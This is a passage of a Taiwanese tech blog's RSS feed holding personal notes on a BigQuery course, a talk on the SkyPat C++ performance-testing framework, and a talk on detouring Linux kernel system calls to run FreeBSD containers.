You could also connect to BigQuery from Excel via an ODBC connector.  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extend Google Sheets using App Script  &lt;/li&gt;
&lt;li&gt;Rich interface  &lt;/li&gt;
&lt;li&gt;JavaScript-based language  &lt;ul&gt;
&lt;li&gt;Create buttons, pulldowns, and so on  &lt;/li&gt;
&lt;li&gt;Create dynamic query parameters  &lt;/li&gt;
&lt;li&gt;Create visualizations  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OWOX BigQuery Reports Add-On  &lt;ul&gt;
&lt;li&gt;Save queries with preset variables  &lt;/li&gt;
&lt;li&gt;Create visualizations  &lt;/li&gt;
&lt;li&gt;Share results  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Alternative to writing scripts  &lt;/li&gt;
&lt;li&gt;Free version available  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ODBC &amp;amp; JDBC Drivers&lt;/h2&gt;
&lt;h3&gt;Simba ODBC/JDBC Drivers (Beta)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Simba ODBC/JDBC Drivers 32-bit and 64-bit Available for Mac, Linux, Windows  &lt;/li&gt;
&lt;li&gt;Supports ANSI SQL-92: SELECT, JOIN, WHERE, HAVING, GROUP  &lt;/li&gt;
&lt;li&gt;BY, ORDER BY, TOP and most SQL-92 scalar and aggregate functions  &lt;/li&gt;
&lt;li&gt;Supports BigQuery’s SQL subset: SELECT, HAVING, WHERE, GROUP BY, ORDER BY, LIMIT, CASE and all functions  &lt;/li&gt;
&lt;li&gt;Supports all BigQuery data types (STRING, INTEGER, FLOAT, BOOLEAN, TIMESTAMP)  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Google has partnered with Simba Technologies to provide updated ODBC and JDBC drivers that leverage the power of BigQuery's Standard SQL (support is also provided for legacy SQL).&lt;br /&gt;
For more information on the Simba ODBC/JDBC drivers for BigQuery, see: &lt;a href="https://cloud.google.com/bigquery/partners/simba-beta-drivers"&gt;https://cloud.google.com/bigquery/partners/simba-beta-drivers&lt;/a&gt;.  &lt;/p&gt;
&lt;h3&gt;Other JDBC Drivers&lt;/h3&gt;
&lt;p&gt;還不 support insert 和 delete  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Starschema JDBC driver for BigQuery  &lt;ul&gt;
&lt;li&gt;Supports server and OAuth2 authentication  &lt;/li&gt;
&lt;li&gt;Supports handling metadata  &lt;/li&gt;
&lt;li&gt;Query transformation capabilities  &lt;/li&gt;
&lt;li&gt;Released to open source - No longer under active development  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CData JDBC driver for BigQuery  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.cdata.com/drivers/bigquery/"&gt;http://www.cdata.com/drivers/bigquery/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Abstracts BigQuery data source into tables, views, stored procedures use to access data  &lt;/li&gt;
&lt;li&gt;要用的時候要跟 Google 拿金鑰放在 JDBS 的 Driver 裏面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Although the Starschema driver is available, no active work has been done since June 2013.&lt;br /&gt;
This means that any enhancements to BigQuery may not be reflected in the driver.  &lt;/p&gt;
&lt;h2&gt;Encrypted BigQuery Client&lt;/h2&gt;
&lt;h3&gt;Encrypted Client&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ebq&lt;/code&gt; commnad&lt;br /&gt;
&lt;a href="https://github.com/google/encrypted-bigquery-client"&gt;https://github.com/google/encrypted-bigquery-client&lt;/a&gt;&lt;br /&gt;
&lt;a href="https://github.com/google/encrypted-bigquery-client/blob/master/tutorial.md"&gt;https://github.com/google/encrypted-bigquery-client/blob/master/tutorial.md&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;An experimental extension to the BigQuery client  &lt;/li&gt;
&lt;li&gt;Offers client-side encryption for a subset of query types  &lt;/li&gt;
&lt;li&gt;Implemented in Python  &lt;/li&gt;
&lt;li&gt;Encrypts data before loading and transforms query to work on top of encrypted data  &lt;/li&gt;
&lt;li&gt;Only available as a replacement for bq CLI  &lt;/li&gt;
&lt;li&gt;Supports multiple encryption modes  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;Pseudonym&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;encrypts the data the same way, given a particular key  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Probabilistic&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;encrypts the same text differently every time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Homomorphic&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Encrypts numeric fields with special mathematical properties allowing mathematical operations on encrypted data to yield encrypted results  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Searchwords&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;Encrypts data so you can find a particular word within a longer string  &lt;/li&gt;
&lt;li&gt;same word is encrypted the same way every time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Probabilistic_searchwords&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;combines the two types of encryption so that a word in encrypted a different way every time  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;None&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;No encryption  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Client Interaction&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Normal client interaction  &lt;ul&gt;
&lt;li&gt;Data on client in normal (unencrypted) state  &lt;/li&gt;
&lt;li&gt;Data moves between client and BigQuery over SSH  &lt;/li&gt;
&lt;li&gt;Data is encrypted in flight and at rest once in BigQuery  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Encrypted client interaction  &lt;ul&gt;
&lt;li&gt;Interface encrypts input data on client  &lt;/li&gt;
&lt;li&gt;Encrypted data moves between client and BigQuery over SSH  &lt;/li&gt;
&lt;li&gt;Data encrypted in flight and at rest once in BigQuery  &lt;/li&gt;
&lt;li&gt;Query results to client are encrypted  &lt;/li&gt;
&lt;li&gt;Client interface decrypts the results  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;BigQuery and R&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Environment for statistical computing  &lt;/li&gt;
&lt;li&gt;Contains large, integrated collection of data analysis tools  &lt;/li&gt;
&lt;li&gt;Graphical facilities  &lt;/li&gt;
&lt;li&gt;Simple and effective programming language  &lt;/li&gt;
&lt;li&gt;BigQuery added as extension package  &lt;/li&gt;
&lt;li&gt;BigQuery allows R to process very large datasets  &lt;/li&gt;
&lt;li&gt;Hundreds of modeling packages available  &lt;/li&gt;
&lt;li&gt;R provides very sophisticated analysis  &lt;/li&gt;
&lt;li&gt;Easy setup and use  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 13: Working with Google Analytics Premium Data&lt;/h1&gt;
&lt;hr /&gt;
&lt;h1&gt;Module 14: Data Visualization&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.google.com/analytics/data-studio/"&gt;https://www.google.com/analytics/data-studio/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Third-party tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;BigQuery integrates with several open-source/commercial tools  &lt;ul&gt;
&lt;li&gt;Tableau, Qlik, iCharts  &lt;/li&gt;
&lt;li&gt;See &lt;a href="https://cloud.google.com/bigquery/third-party-tools"&gt;third-party tools and services&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;All tools provide report, dashboard creation capability  &lt;/li&gt;
&lt;li&gt;Vendor offerings may be cloud-based, client-based, both  &lt;/li&gt;
&lt;li&gt;Each tool may have a different underlying proprietary technology  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Spreadsheet Visualization&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Cost-effective option  &lt;/li&gt;
&lt;li&gt;Limited in business intelligence functionality  &lt;/li&gt;
&lt;li&gt;Visualization capabilities may not be as robust as a business intelligence tool  &lt;ul&gt;
&lt;li&gt;May require additional scripting  &lt;/li&gt;
&lt;li&gt;搭配 Google App Script 使用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use third-party application or ODBC driver  &lt;ul&gt;
&lt;li&gt;BigQuery Connector for Microsoft Excel  &lt;/li&gt;
&lt;li&gt;Simba ODBC Driver  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Datalab&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/datalab/docs/quickstarts/"&gt;https://cloud.google.com/datalab/docs/quickstarts/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Use Datalab on Google Cloud Shell&lt;/h3&gt;
&lt;p&gt;好像只要直接在 Cloud Shell 用&lt;a href="https://cloud.google.com/datalab/docs/quickstarts/quickstart-local"&gt;在 local 用 docker 執行 datalab 的方法&lt;/a&gt;就行了&lt;br /&gt;
&lt;code&gt;docker run -it -p "127.0.0.1:8081:8080" -v "${HOME}:/content" -e "PROJECT_ID=${PROJECT_ID}" gcr.io/cloud-datalab/datalab:local&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;不需要用到 &lt;a href="https://cloud.google.com/datalab/docs/quickstarts/quickstart-gcp"&gt;https://cloud.google.com/datalab/docs/quickstarts/quickstart-gcp&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;docker run -it -p "127.0.0.1:8081:8080" -v "${HOME}:/content" -e "GATEWAY_VM=project-id/zone/instance-name" gcr.io/cloud-datalab/datalab:local&lt;/code&gt;&lt;br /&gt;
因為用這個方法似乎還得額外開一台 VM。  &lt;/p&gt;
&lt;p&gt;在 Cloud Shell 輸入&lt;br /&gt;
&lt;code&gt;docker run -it -p "127.0.0.1:8081:8080" -v "${HOME}:/content" -e "PROJECT_ID=${DEVSHELL_PROJECT_ID}" gcr.io/cloud-datalab/datalab:local&lt;/code&gt;&lt;br /&gt;
(好像有些 Cloud Shell 不知道為何會沒有 &lt;code&gt;$DEVSHELL_PROJECT_ID&lt;/code&gt;，沒有的話就手動輸入吧)&lt;br /&gt;
好了之後再點選左上角第一個 Web preview，選擇 Change port 8081，應該就會開啟一個連到剛剛建立的 datalab 的分頁了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;BigQuery Public datasets&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.gdeltproject.org/data.html#googlebigquery"&gt;http://www.gdeltproject.org/data.html#googlebigquery&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://nyctaximap.appspot.com/"&gt;http://nyctaximap.appspot.com/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/bigquery/"&gt;https://www.reddit.com/r/bigquery/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://cloud.google.com/bigquery/public-data/"&gt;https://cloud.google.com/bigquery/public-data/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 16 Dec 2016 17:07:43 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-12-15:posts/2016/12/15/cpb200-bigquery-for-data-analysts/</guid><category>Google Cloud Platform</category></item><item><title>Cat System Workshop #12: SkyPat: C++ Performance Analysis and Testing Framework</title><link>https://blog.m157q.tw/posts/2016/10/11/cat-system-workshop-12-skypat-c-performance-analysis-and-testing-framework/</link><description>&lt;h2&gt;Info&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Speaker: Peter Chang  &lt;/li&gt;
&lt;li&gt;Event Link: &lt;a href="http://www.accupass.com/go/cat1011"&gt;http://www.accupass.com/go/cat1011&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;GitHub Repo: &lt;a href="https://github.com/skymizer/SkyPat"&gt;https://github.com/skymizer/SkyPat&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Regions of code  &lt;/li&gt;
&lt;li&gt;SkyPat  &lt;ul&gt;
&lt;li&gt;Define unittest, checking both correctness and performance for you.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;#include &amp;lt;pat/pat.h&amp;gt;&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;A glace at SkyPat  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;pat/pat.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="c1"&gt;// In MathCase, fibonacci_test  &lt;/span&gt;
&lt;span class="n"&gt;PAT_F&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MathCase&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;fibonacci_test&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="n"&gt;ASSERT_TRUE&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fibonacci&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="n"&gt;EXPECT_EQ&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fibonacci&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="n"&gt;PERFORM&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
        &lt;span class="n"&gt;fibonacci&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="p"&gt;}&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  

&lt;span class="c1"&gt;// 一個 case 裏面有很多個 tests  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Loop-Intensive  &lt;ul&gt;
&lt;li&gt;Benefic Compiler Optimization  &lt;/li&gt;
&lt;li&gt;比較容易展開  &lt;/li&gt;
&lt;li&gt;測試效能也比較沒那麼困難，主要就看這段 code 要被執行幾次。  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;GIMP  &lt;/li&gt;
&lt;li&gt;Skymizer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Call Intensive  &lt;ul&gt;
&lt;li&gt;Damage Compilter Optimization  &lt;/li&gt;
&lt;li&gt;Difficult to Evaluate  &lt;/li&gt;
&lt;li&gt;比較難處理  &lt;/li&gt;
&lt;li&gt;如果產生得出夠完整的 call graph，可能可以做些優化  &lt;/li&gt;
&lt;li&gt;Loop 展開不太有效果  &lt;/li&gt;
&lt;li&gt;只能試試看能不能減少呼叫  &lt;/li&gt;
&lt;li&gt;有很多不知道的小瓶頸  &lt;/li&gt;
&lt;li&gt;Example:  &lt;ul&gt;
&lt;li&gt;Browsers (Chrome, Firefox)  &lt;/li&gt;
&lt;li&gt;Editors (Evernote, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;SkyPat 就是專門用來處理 Call Intensive 這種惱人的效能分析的  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;perf&lt;/code&gt; cannot evaluate regions of code.  &lt;/li&gt;
&lt;li&gt;SkyPat integrates &lt;code&gt;perf_event&lt;/code&gt; to evaluate regions of code.  &lt;/li&gt;
&lt;li&gt;"Software Task Clock" is still not cycle-accurate  &lt;/li&gt;
&lt;li&gt;Only cycle-accurate timer w/o OS interference.  &lt;/li&gt;
&lt;li&gt;Can evaluate call-intensive program  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Install:  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ git clone https://github.com/skymizer/SkyPat.git&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;Usage  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;pat/pat.h&amp;gt;  &lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="n"&gt;pat&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Test&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Initialize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
    &lt;span class="n"&gt;pat&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;Test&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;RunAll&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;SkyPat v3.0 will be released at Oct 30th.  &lt;/li&gt;
&lt;li&gt;Add more Perf events  &lt;/li&gt;
&lt;li&gt;Welcome feedbac and patches  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;其他的 tool 只能測量 function level，&lt;br /&gt;
但 SkyPat 可以測量 block level。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;目前還是非常初步的產品，&lt;br /&gt;
也歡迎使用者、貢獻者開 Issues 跟 Pull Request，&lt;br /&gt;
一起討論也很歡迎。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/googletest"&gt;GitHub - google/googletest: Google Test&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Tue, 11 Oct 2016 19:46:58 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-10-11:posts/2016/10/11/cat-system-workshop-12-skypat-c-performance-analysis-and-testing-framework/</guid><category>Skymizer</category><category>Cat System Workshop</category><category>Meetup</category><category>C++</category><category>Performance</category><category>Unit-test</category><category>framework</category></item><item><title>Cat System Workshop #11 Dynamically Hacking the Kernel with Containers</title><link>https://blog.m157q.tw/posts/2016/09/21/cat-system-workshop-11-dynamically-hacking-the-kernel-with-containers/</link><description>&lt;h2&gt;Info&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;活動網址：&lt;a href="http://www.accupass.com/go/cat0920"&gt;http://www.accupass.com/go/cat0920&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Spaker: 高魁良  &lt;/li&gt;
&lt;li&gt;Slides:&lt;a href="http://www.slideshare.net/QueyLiangKao/talk-160920-cat-system-workshop-66199432"&gt;Talk 160920 @ Cat System Workshop&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;講者在 ContainerCon Japan 2016 的投影片： &lt;a href="http://events.linuxfoundation.org/sites/events/files/slides/talk_7.pdf"&gt;Dynamically Hacking the Kernel with Containers - ContainerCon Japan 2016 Tokyo - Quey-Liang Kao - National Tsing Hua University, Taiwan&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Note&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;稍微提到了一下 Live Kernel Patching  &lt;/li&gt;
&lt;li&gt;Kernel Detouring  &lt;ul&gt;
&lt;li&gt;有點類似 Rootkit 的感覺  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Intel 也有在開發 Container，叫作 Clear Container，最近公佈了 2.0 版。  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://clearlinux.org/clear-containers"&gt;https://clearlinux.org/clear-containers&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;可以在 Linux 的機器上跑 FreeBSD 的 container，透過換掉 System call 的 table 來達成。  &lt;/li&gt;
&lt;li&gt;Specific Challengs (FreeBSD)  &lt;ul&gt;
&lt;li&gt;Corresponding system calls  &lt;ul&gt;
&lt;li&gt;Flag numbers are not portable  &lt;/li&gt;
&lt;li&gt;Different calling/exiting conventions  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unique system calls  &lt;ul&gt;
&lt;li&gt;Re-implementation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;General Challenges  &lt;ul&gt;
&lt;li&gt;Insufficient isolation  &lt;/li&gt;
&lt;li&gt;Limitation of development  &lt;ul&gt;
&lt;li&gt;live patching should only be a temporary solution.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Other Binary Compatibility Work  &lt;ul&gt;
&lt;li&gt;Wine  &lt;ul&gt;
&lt;li&gt;Special loader for PEs/DLLs  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;FreeBSD, Windows 10  &lt;ul&gt;
&lt;li&gt;Kernel built-in compatibility layer for Linux binary.  &lt;ul&gt;
&lt;li&gt;FreeBSD i386  &lt;/li&gt;
&lt;li&gt;Windows 10: Ubuntu on Windows 10 也是用類似的方法  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;System call remapping/re-implementation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;How&lt;/h2&gt;
&lt;h3&gt;Step 0: Setup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Environment (x86_64 maching)  &lt;ul&gt;
&lt;li&gt;Linux 4.6.2  &lt;/li&gt;
&lt;li&gt;FreeBSD 10.2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tools  &lt;ul&gt;
&lt;li&gt;kpatch: A tool for kernel livepatch  &lt;/li&gt;
&lt;li&gt;docker  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Step 1: From LivePatching to Detouring&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;kernel/livepatch/core.c.orig:klp_ftrace_handler  

klp_arch_set_pc(regs, (unsigned long)func-&amp;gt;new_func);  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;目前 LivePatching 最成熟的還是在 x86 的 machine 上  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Ftrace in LivePatching&lt;/h4&gt;
&lt;p&gt;在 kernel 的 config 中要 enable &lt;code&gt;ftrace&lt;/code&gt; 和 &lt;code&gt;fentry&lt;/code&gt;&lt;br /&gt;
可以透過 ftrace 去抓到每個 function 被 call 的時間點。  &lt;/p&gt;
&lt;h4&gt;Ftrace in Detouring&lt;/h4&gt;
&lt;h3&gt;Step 2: Detour-able Entry Point&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Assembly file is NOT detour-able  &lt;ul&gt;
&lt;li&gt;順便一提，也不支持 in-line function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Step 3: Detoured Entry Point&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;maintain 一個 FreeBSD 的 system call table (不是一個 function pointer 的 table)  &lt;/li&gt;
&lt;li&gt;達到 remapping syscall 的效果  &lt;/li&gt;
&lt;li&gt;目前是用苦功寫死一個一個對應  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat maps | wc -l&lt;/code&gt; 有 149 個可以互相對應的  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat syscall.h | wc -l&lt;/code&gt; 468 FreeBSD 的 syscall  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat unistd_64.h | wc -l&lt;/code&gt; 332 Linux 的 syscall  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;The workflow&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Launch a normal container  &lt;/li&gt;
&lt;li&gt;Run a init script  &lt;ul&gt;
&lt;li&gt;which enables the specific detour modules  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A FreeBSD environment in the container  &lt;/li&gt;
&lt;li&gt;On exit  &lt;ul&gt;
&lt;li&gt;disable detour modules  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Demo&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Truss_(Unix)"&gt;truss (Unix) - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Linux 跟 FreeBSD 的 &lt;code&gt;execve&lt;/code&gt; 剛好是同個號碼  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;總結&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The kernel detouring demo attempts to indicate a possible movement of the development of OS containers  &lt;ul&gt;
&lt;li&gt;as a proof-of-concept  &lt;/li&gt;
&lt;li&gt;kpatch as a temporary solution  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Future direction  &lt;ul&gt;
&lt;li&gt;Make more fun  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;一些討論&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;自己寫一個 ftrace handler 改掉 detour 的 destination 可能會是比較好的作法。  &lt;/li&gt;
&lt;li&gt;講者在日本的 ContainerCon 給 talk 的時候有人給了 &lt;code&gt;execution domain&lt;/code&gt; 這個關鍵字。  &lt;ul&gt;
&lt;li&gt;Linux 在 2015 前有個東西叫作，&lt;a href="https://linux.die.net/man/2/personality"&gt;execution domain&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;BSD 的部份是沒有實作的。(no effects.)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;這邊只有針對 syscall 的 entry point 去改,沒有要 hook 到多深，也許會覺得用 ftrace 太 powerful，何不改寫 ptrace 就好。或是直接使用 user space Linux 等等。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.freebsd.org/doc/en_US.ISO8859-1/articles/linux-emulation/article.html"&gt;Linux® emulation in FreeBSD&lt;/a&gt;  &lt;blockquote&gt;
